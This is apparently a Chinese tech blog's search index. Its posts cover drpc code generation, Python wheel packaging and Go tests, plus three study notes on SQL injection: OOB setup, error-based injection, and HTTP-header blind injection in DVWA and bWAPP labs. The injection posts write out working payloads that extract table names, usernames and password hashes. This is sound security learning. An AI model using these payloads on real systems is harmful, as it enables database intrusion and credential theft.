<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>drpc的代码生成工具的简单改造</title>
    <link href="/2023/04/26/drpc%E7%9A%84%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E6%94%B9%E9%80%A0/"/>
    <url>/2023/04/26/drpc%E7%9A%84%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E6%94%B9%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h4 id="前文"><a href="#前文" class="headerlink" title="前文"></a>前文</h4><p>由于项目组用了一个轻量的golang rpc框架——drpc，出现了http接口，json字段omitempty无法配置，导致restful接口，字段值是对应类型的零值时，接口不是返回零值，而是直接不返回该字段。如接口预期返回是：</p><pre><code class="hljs plain">&#123;  &quot;code&quot;: 0,  &quot;message&quot;: &quot;hello world&quot;,  &quot;data&quot;: []&#125;</code></pre><p>实际drpc的restful服务返回的是：</p><pre><code class="hljs plain">&#123;  &quot;message&quot;: &quot;hello world&quot;&#125;</code></pre><p>因此研究了下drpc的源码，并进行了相应改造，解决这一问题</p><h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p>通过观察pb文件，发现drpc使用的json marshal工具不是内置的encording/json 包，而是 protojson 包<br><img src="/img/drpc2.jpeg" srcset="/img/loading.gif" alt="image"><br>再看protojson 的MarshalOptions源码，就很清晰了，EmitUnpopulated 就是类似json tag的omitempty</p><pre><code class="hljs Go"><span class="hljs-comment">// MarshalOptions is a configurable JSON format marshaler.</span><span class="hljs-keyword">type</span> MarshalOptions <span class="hljs-keyword">struct</span> &#123;pragma.NoUnkeyedLiterals<span class="hljs-comment">// Multiline specifies whether the marshaler should format the output in</span><span class="hljs-comment">// indented-form with every textual element on a new line.</span><span class="hljs-comment">// If Indent is an empty string, then an arbitrary indent is chosen.</span>Multiline <span class="hljs-keyword">bool</span><span class="hljs-comment">// Indent specifies the set of indentation characters to use in a multiline</span><span class="hljs-comment">// formatted output such that every entry is preceded by Indent and</span><span class="hljs-comment">// terminated by a newline. If non-empty, then Multiline is treated as true.</span><span class="hljs-comment">// Indent can only be composed of space or tab characters.</span>Indent <span class="hljs-keyword">string</span><span class="hljs-comment">// AllowPartial allows messages that have missing required fields to marshal</span><span class="hljs-comment">// without returning an error. If AllowPartial is false (the default),</span><span class="hljs-comment">// Marshal will return error if there are any missing required fields.</span>AllowPartial <span class="hljs-keyword">bool</span><span class="hljs-comment">// UseProtoNames uses proto field name instead of lowerCamelCase name in JSON</span><span class="hljs-comment">// field names.</span>UseProtoNames <span class="hljs-keyword">bool</span><span class="hljs-comment">// UseEnumNumbers emits enum values as numbers.</span>UseEnumNumbers <span class="hljs-keyword">bool</span><span class="hljs-comment">// EmitUnpopulated specifies whether to emit unpopulated fields. It does not</span><span class="hljs-comment">// emit unpopulated oneof fields or unpopulated extension fields.</span><span class="hljs-comment">// The JSON value emitted for unpopulated fields are as follows:</span><span class="hljs-comment">//  ╔═══════╤════════════════════════════╗</span><span class="hljs-comment">//  ║ JSON  │ Protobuf field             ║</span><span class="hljs-comment">//  ╠═══════╪════════════════════════════╣</span><span class="hljs-comment">//  ║ false │ proto3 boolean fields      ║</span><span class="hljs-comment">//  ║ 0     │ proto3 numeric fields      ║</span><span class="hljs-comment">//  ║ ""    │ proto3 string/bytes fields ║</span><span class="hljs-comment">//  ║ null  │ proto2 scalar fields       ║</span><span class="hljs-comment">//  ║ null  │ message fields             ║</span><span class="hljs-comment">//  ║ []    │ list fields                ║</span><span class="hljs-comment">//  ║ &#123;&#125;    │ map fields                 ║</span><span class="hljs-comment">//  ╚═══════╧════════════════════════════╝</span>EmitUnpopulated <span class="hljs-keyword">bool</span><span class="hljs-comment">// Resolver is used for looking up types when expanding google.protobuf.Any</span><span class="hljs-comment">// messages. If nil, this defaults to using protoregistry.GlobalTypes.</span>Resolver <span class="hljs-keyword">interface</span> &#123;protoregistry.ExtensionTypeResolverprotoregistry.MessageTypeResolver&#125;&#125;</code></pre><p>接下来的工作就是让drpc生成的pb代码中，protojson.Marshal 方法使用这个配置。所以再回到drpc源码，找到生成这一段代码的位置：<br><img src="/img/drpc3.jpeg" srcset="/img/loading.gif" alt="image"></p><p>并做如下修改：<br><img src="/img/drpc4.png" srcset="/img/loading.gif" alt="image"></p><p>剩下的工作就是把protoc-gen-go-drpc工具重新编译即可，最终生成的pb文件，protocjson.Marshal方法也成功使用了MarshalOptions配置：<br><img src="/img/drpc5.png" srcset="/img/loading.gif" alt="image"></p><p>附上生成drpc pb代码的镜像</p><pre><code class="hljs plain">FROM golang:1.19-alpine3.16 as builderENV GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.cn,directWORKDIR &#x2F;srcCOPY . &#x2F;srcRUN go mod download -xRUN go build -o &#x2F;bin&#x2F;protoc-gen-go cmd&#x2F;protoc-gen-go&#x2F;main.goRUN go build -o &#x2F;bin&#x2F;protoc-gen-go-drpc main.goFROM alpine:3.16RUN apk updateRUN apk add protobufCOPY --from&#x3D;builder &#x2F;bin&#x2F;protoc-gen-go-drpc &#x2F;binCOPY --from&#x3D;builder &#x2F;bin&#x2F;protoc-gen-go &#x2F;binWORKDIR &#x2F;protobufENTRYPOINT protoc --go_out&#x3D;&#x2F;out --go-drpc_out&#x3D;&#x2F;out --proto_path&#x3D;. $(find .&#x2F; -name &#39;*.proto&#39;)# docker build -f Dockerfile -t tc&#x2F;protoc-drpc .# docker run --rm -v $(pwd)&#x2F;protobuf:&#x2F;protobuf -v $(pwd):&#x2F;out tc&#x2F;protoc-drpc</code></pre><h4 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h4><p>debug期间也对protobuf-go工具，做了修改，实现生成的pb文件的字段，json tag 不携带 omitempty，具体修改如下：<br><img src="/img/drpc6.png" srcset="/img/loading.gif" alt="image"></p><p><img src="/img/drpc7.jpeg" srcset="/img/loading.gif" alt="image"><br>最后，非必要还是用grpc这种社区更活跃的框架吧</p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python项目打包为whl包</title>
    <link href="/2022/07/07/Python%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E4%B8%BAwhl%E5%8C%85/"/>
    <url>/2022/07/07/Python%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E4%B8%BAwhl%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h3 id="Python项目打包为whl包"><a href="#Python项目打包为whl包" class="headerlink" title="Python项目打包为whl包"></a>Python项目打包为whl包</h3><h4 id="1、进入要打包的项目根目录下，创建setup-py："><a href="#1、进入要打包的项目根目录下，创建setup-py：" class="headerlink" title="1、进入要打包的项目根目录下，创建setup.py："></a>1、进入要打包的项目根目录下，创建setup.py：</h4><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages setup(    name = <span class="hljs-string">"driver"</span>,    version = <span class="hljs-string">"0.1"</span>,    packages = find_packages(),    <span class="hljs-comment">#目标文件</span>    py_modeles = <span class="hljs-string">'driver_classification.py'</span>,    <span class="hljs-comment">#excel文件</span>    data_file = <span class="hljs-string">'driver_model_data.xlsx'</span>,    include_package_data = <span class="hljs-literal">True</span>,    <span class="hljs-comment">#包含所有.xlsx文件</span>    package_data = &#123;)</code></pre><h5 id="setup函数各参数详解："><a href="#setup函数各参数详解：" class="headerlink" title="setup函数各参数详解："></a>setup函数各参数详解：</h5><pre><code class="hljs plain">--name              包名称  --version (-V)      包版本  --author            程序的作者  --author_email      程序的作者的邮箱地址  --maintainer        维护者  --maintainer_email  维护者的邮箱地址  --url               程序的官网地址  --license           程序的授权信息  --description       程序的简单描述  --long_description  程序的详细描述  --platforms         程序适用的软件平台列表  --classifiers       程序的所属分类列表  --keywords          程序的关键字列表  --packages  需要打包的目录列表  --py_modules  需要打包的python文件列表  --download_url  程序的下载地址  --cmdclass    --data_files  打包时需要打包的数据文件，如图片，配置文件等  --scripts  安装时需要执行的脚步列表</code></pre><h4 id="2、打包文件"><a href="#2、打包文件" class="headerlink" title="2、打包文件"></a>2、打包文件</h4><pre><code class="hljs python"><span class="hljs-comment"># 打包为egg文件</span>python setup.py bdist_egg<span class="hljs-comment"># 打包为whl文件</span>python setup.py bdist_wheel</code></pre><h5 id="运行后会在当前目录多出3个文件夹：build、dist、driver-egg-info"><a href="#运行后会在当前目录多出3个文件夹：build、dist、driver-egg-info" class="headerlink" title="运行后会在当前目录多出3个文件夹：build、dist、driver.egg-info"></a>运行后会在当前目录多出3个文件夹：build、dist、driver.egg-info</h5><h5 id="打包好后的whl文件在dist文件夹内，进入dist文件夹中安装whl文件："><a href="#打包好后的whl文件在dist文件夹内，进入dist文件夹中安装whl文件：" class="headerlink" title="打包好后的whl文件在dist文件夹内，进入dist文件夹中安装whl文件："></a>打包好后的whl文件在dist文件夹内，进入dist文件夹中安装whl文件：</h5><pre><code class="hljs python">pip install driver<span class="hljs-number">-0.1</span>-py3-none-any.whl</code></pre>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 测试用例</title>
    <link href="/2022/07/03/Go-%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/"/>
    <url>/2022/07/03/Go-%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h3 id="Go-测试用例"><a href="#Go-测试用例" class="headerlink" title="Go 测试用例"></a>Go 测试用例</h3><h4 id="前置条件："><a href="#前置条件：" class="headerlink" title="前置条件："></a>前置条件：</h4><h5 id="1、文件名须以”-test-go”结尾"><a href="#1、文件名须以”-test-go”结尾" class="headerlink" title="1、文件名须以”_test.go”结尾"></a>1、文件名须以”_test.go”结尾</h5><h5 id="2、方法名须以”Test”打头，并且形参为-t-testing-T"><a href="#2、方法名须以”Test”打头，并且形参为-t-testing-T" class="headerlink" title="2、方法名须以”Test”打头，并且形参为 (t *testing.T)"></a>2、方法名须以”Test”打头，并且形参为 (t *testing.T)</h5><h5 id="举例：-hello-test-go"><a href="#举例：-hello-test-go" class="headerlink" title="举例：/hello_test.go"></a>举例：/hello_test.go</h5><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">"testing"</span><span class="hljs-string">"fmt"</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestHello</span><span class="hljs-params">(t *testing.T)</span></span> &#123;fmt.Println(<span class="hljs-string">"TestHello"</span>)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestWorld</span><span class="hljs-params">(t *testing.T)</span></span> &#123;fmt.Println(<span class="hljs-string">"TestWorld"</span>)&#125;</code></pre><h5 id="测试整个文件："><a href="#测试整个文件：" class="headerlink" title="测试整个文件："></a>测试整个文件：</h5><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> go <span class="hljs-built_in">test</span> -v hello_test.go</span></code></pre><pre><code class="hljs plain">&#x3D;&#x3D;&#x3D; RUN   TestHelloTestHello--- PASS: TestHello (0.00s)&#x3D;&#x3D;&#x3D; RUN   TestWorldTestWorld--- PASS: TestWorld (0.00s)PASSok  command-line-arguments0.007s</code></pre><p>测试单个函数：</p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> go <span class="hljs-built_in">test</span> -v hello_test.go -test.run TestHello</span></code></pre><pre><code class="hljs plain">&#x3D;&#x3D;&#x3D; RUN   TestHelloTestHello--- PASS: TestHello (0.00s)PASSok  command-line-arguments0.008s</code></pre>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
      <category>Test</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Web攻防安全实战》学习总结：SQL注入实战—-OOB注入</title>
    <link href="/2021/03/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94-OOB%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/03/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94-OOB%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="OOB注入涉及原理"><a href="#OOB注入涉及原理" class="headerlink" title="OOB注入涉及原理"></a>OOB注入涉及原理</h1><h2 id="OOB注入（Out-of-Band："><a href="#OOB注入（Out-of-Band：" class="headerlink" title="OOB注入（Out of Band："></a>OOB注入（Out of Band：</h2><p>带外通道技术（OOB）让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。这类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。<br>带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后攻击者可以通过这个请求提取数据。</p><h2 id="泛域名解析"><a href="#泛域名解析" class="headerlink" title="泛域名解析"></a>泛域名解析</h2><p>泛域名解析就是利用通配符的方式将所有的次级域名指向同一IP。如<a href="http://www.example.com和abc.example.com都会访问到同一个站点。" target="_blank" rel="noopener">www.example.com和abc.example.com都会访问到同一个站点。</a></p><h2 id="UNC路径："><a href="#UNC路径：" class="headerlink" title="UNC路径："></a>UNC路径：</h2><p>Universal Naming Convention/通用命名规则。<br>Windows主机默认存在，Linux主机默认不存在。格式：\servername\sharename，其中servername是服务器名，sharename是共享资源的名称。<br>我们平时使用打印机、网络共享文件夹时，都会用到UNC填写地址，并且在当我们在使用UNC路径时，会对域名进行DNS查询。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="CEYE平台"><a href="#CEYE平台" class="headerlink" title="CEYE平台"></a>CEYE平台</h2><p>CEYE平台可以监控DNS请求，并且配置了泛域名解析。<br><img src="/img/sql/oob/ceye1.png" srcset="/img/loading.gif" alt="fileupload"><br>对注册后分配到域名和其泛域名进行解析测试，可在平台上成功查询到解析记录：<br><img src="/img/sql/oob/ceye2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/oob/ceye3.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><p>安装phpstudy，启动Apache、Mysql服务器;同时安装较低版本的php，如5.2.17：<br><img src="/img/sql/oob/phpstudy1.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/oob/phpstudy2.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>修改MySQL服务器权限，运行root用户远程登录：<br><img src="/img/sql/oob/phpstudy3.png" srcset="/img/loading.gif" alt="fileupload"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Web攻防安全实战》学习总结：SQL注入实战——数据库报错注入</title>
    <link href="/2021/01/17/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/01/17/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="MySQL报错注入主要分类"><a href="#MySQL报错注入主要分类" class="headerlink" title="MySQL报错注入主要分类"></a>MySQL报错注入主要分类</h2><p>1、BigInt等数据类型溢出<br>2、Xpath语法错误<br>3、count() + rand() + group_by()导致重复<br>4、空间数据类型函数错误</p><h2 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h2><h3 id="1、floor函数"><a href="#1、floor函数" class="headerlink" title="1、floor函数"></a>1、floor函数</h3><h4 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h4><pre><code class="hljs plain">floor(): 去除小数部分count(x): 返回x数据集的数量rand(): 产生随机数rand(x): 每个x对应一个固定的值，但是如果连续执行多次值会变化，不过也是可预测的floor(rand(0)*2):对应的有规律数列为 011011...</code></pre><h4 id="注入SQL："><a href="#注入SQL：" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">select count(*) ,concat(database(),floor(rand(0)*2))x from test group by x ：x表示前面括号内的别名</code></pre><h4 id="报错信息："><a href="#报错信息：" class="headerlink" title="报错信息："></a>报错信息：</h4><pre><code class="hljs plain">Can&#39;t write；duplicate key in table ‘&#x2F;tmp&#x2F;#sql935_27_2f’</code></pre><h4 id="原理剖析："><a href="#原理剖析：" class="headerlink" title="原理剖析："></a>原理剖析：</h4><p>该注入的关键函数是group by x，即group by (floor(rand(0)<em>2))；首先明白两个概念：group by查询会新建一张虚拟表，保存查询的结果，而rand函数每被调用一次就会进行一次计算。<br>如下图，sql语句第一次执行时，floor(rand(0)</em>2)=0，查询虚拟表主键0，不存在，判断直接插入，在插入时会在group by x再次计算floor(rand(0)<em>2)=1，因此实际插入的主键值=1；第二次查询时floor(rand(0)</em>2)=1，主键存在，主键直接+1插入即可；再次进行floor(rand(0)<em>2)计算，此时是floor(rand(0)</em>2)的第四次运算，值为0，需要插入主键为0的数据，和第一次插入一样，执行过程会运行group by x，实际插入的主键值变成1，导致主键重复，数据库报错。<br><img src="/img/sql/errorbase/error1.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="2、extractvalue函数（最多32字符）"><a href="#2、extractvalue函数（最多32字符）" class="headerlink" title="2、extractvalue函数（最多32字符）"></a>2、extractvalue函数（最多32字符）</h3><p>extractvalue() :对XML文档进行查询的函数</p><p>其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样<br>语法：extractvalue(目标xml文档，xml路径)</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，<br>如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p><h4 id="注入SQL：-1"><a href="#注入SQL：-1" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">?id&#x3D;1&#39; and extractvalue(1, concat(0x7e (select @@version))) --&#39;</code></pre><h4 id="原理剖析：-1"><a href="#原理剖析：-1" class="headerlink" title="原理剖析："></a>原理剖析：</h4><p>使用concat函数，将错误信息进行拼接，使用0x7e波浪号，extractvalue函数无法处理的字符，防止select @@version 被截断<br><img src="/img/sql/errorbase/error2.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="3、updatexml函数"><a href="#3、updatexml函数" class="headerlink" title="3、updatexml函数"></a>3、updatexml函数</h3><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>语法updatexml(目标xml文档，xml路径，更新的内容)</p><p>extractvalue()、updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p><h4 id="注入SQL：-2"><a href="#注入SQL：-2" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">?id&#x3D;2&#39; and updatexml(1, concat(0x7e (select @@version))) --&#39;</code></pre><h3 id="4、exp-函数"><a href="#4、exp-函数" class="headerlink" title="4、exp()函数"></a>4、exp()函数</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><p>～():取反函数，例如一个正数取反，会变成一个负数，负数用数字形式表示是一个很庞大的数字，传入exp会导致exp函数无法处理从而报错，如下图：<br><img src="/img/sql/errorbase/error3.png" srcset="/img/loading.gif" alt="fileupload"><br>注意，exp()产生错误，只会返回执行语句的表达式，需要联合后端脚本语言进行解析，从而返回相应的执行结果</p><h2 id="报错注入实战"><a href="#报错注入实战" class="headerlink" title="报错注入实战"></a>报错注入实战</h2><h3 id="使用extractvalue-函数获取用户和数据库名"><a href="#使用extractvalue-函数获取用户和数据库名" class="headerlink" title="使用extractvalue()函数获取用户和数据库名"></a>使用extractvalue()函数获取用户和数据库名</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, concat(0x7e, user(), 0x7e,database())) -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error4.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="使用floor函数获取用户表名"><a href="#使用floor函数获取用户表名" class="headerlink" title="使用floor函数获取用户表名"></a>使用floor函数获取用户表名</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 2, 1),&#39;|&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error5.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="使用extractvalue-函数获取用户表字段"><a href="#使用extractvalue-函数获取用户表字段" class="headerlink" title="使用extractvalue()函数获取用户表字段"></a>使用extractvalue()函数获取用户表字段</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 3,1))) -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error8.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="使用floor函数获取用户名密码"><a href="#使用floor函数获取用户名密码" class="headerlink" title="使用floor函数获取用户名密码"></a>使用floor函数获取用户名密码</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select user from dvwa.users limit 0,1),&#39;|&#39;,    floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select password from dvwa.users limit 0,1),&#39;|&#39;,    floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error6.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/errorbase/error7.png" srcset="/img/loading.gif" alt="fileupload"></p><p>⚠️注意：使用extractvalue函数获取密码时，最大长度为32位，密码hash很有可能被截断，导致获取不全，需要结合mid函数获取。</p><pre><code class="hljs plain"># 第一次获取前29位http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),1,29)) -- &amp;Submit&#x3D;Submit## 第二次从第29位获取29位http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),29,29)) -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error9.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/errorbase/error10.png" srcset="/img/loading.gif" alt="fileupload"><br>两次结果拼接和floor函数取出的admin密码一致。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Web攻防安全实战》学习总结：SQL注入实战——HTTP头盲注</title>
    <link href="/2021/01/09/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94HTTP%E5%A4%B4%E7%9B%B2%E6%B3%A8/"/>
    <url>/2021/01/09/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94HTTP%E5%A4%B4%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP头盲注"><a href="#HTTP头盲注" class="headerlink" title="HTTP头盲注"></a>HTTP头盲注</h1><h2 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h2><p>针对HTTP的请求头，如果不进行过滤和转义，直接与数据库进行交互，就容易被利用进行SQL注入攻击，即HTTP头注入。</p><h2 id="HTTP头盲注实战"><a href="#HTTP头盲注实战" class="headerlink" title="HTTP头盲注实战"></a>HTTP头盲注实战</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>选择bwapp相应的漏洞靶场SQL Injection - Stored (User-Agent)，页面会记录登录设备的UA和IP。<br><img src="/img/sql/httpheader/httpheader1.png" srcset="/img/loading.gif" alt="fileupload"><br>burpsuite抓包修改UA值，发现UA可控，且添加单引号判断存在注入点：<br><img src="/img/sql/httpheader/httpheader2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader3.png" srcset="/img/loading.gif" alt="fileupload"><br>通过页面判断，ip和UA的值都是由用户输入后端服务的，猜测使用insert … value … 语句，构造语句，同时利用 # 闭合sql语句排除干扰，观察页面，ip和UA被成功修改：<br><img src="/img/sql/httpheader/httpheader4.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader5.png" srcset="/img/loading.gif" alt="fileupload"><br>简单构造注入语句，查询数据库名称：<br><img src="/img/sql/httpheader/httpheader7.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader8.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="获取用户表名"><a href="#获取用户表名" class="headerlink" title="获取用户表名"></a>获取用户表名</h3><p>构造语句获取数据库表：<br><img src="/img/sql/httpheader/httpheader9.png" srcset="/img/loading.gif" alt="fileupload"><br>发现每次返回数据行数限制为1行，修改语句再次执行，返回的表名为blog不是用户表：<br><img src="/img/sql/httpheader/httpheader10.png" srcset="/img/loading.gif" alt="fileupload"><br>通过offset控制返回第几条，当offset=3时，返回用户表users：<br><img src="/img/sql/httpheader/httpheader11.png" srcset="/img/loading.gif" alt="fileupload"></p><pre><code class="hljs plain">123&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 3)); #</code></pre><h3 id="获取用户表信息"><a href="#获取用户表信息" class="headerlink" title="获取用户表信息"></a>获取用户表信息</h3><p>过程和上述类似，利用以下指令即可查得id,继续利用偏移查询 id login password 分别位于偏移 0, 1, 2 处</p><pre><code class="hljs plain">111&#39;, (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1 offset 0)); #</code></pre><p><img src="/img/sql/httpheader/httpheader12.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="获取用户名密码"><a href="#获取用户名密码" class="headerlink" title="获取用户名密码"></a>获取用户名密码</h3><pre><code class="hljs plain">111&#39;, (select login from users limit 1 offset 2)); #</code></pre><p>将login替换为id、password 同时修改offset值，即可获得相应用户的密码信息。<br><img src="/img/sql/httpheader/httpheader13.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="漏洞进阶"><a href="#漏洞进阶" class="headerlink" title="漏洞进阶"></a>漏洞进阶</h2><h3 id="修改靶场代码逻辑"><a href="#修改靶场代码逻辑" class="headerlink" title="修改靶场代码逻辑"></a>修改靶场代码逻辑</h3><pre><code class="hljs plain">&#x2F;&#x2F; Writes the entry into the database$sql &#x3D; &quot;INSERT 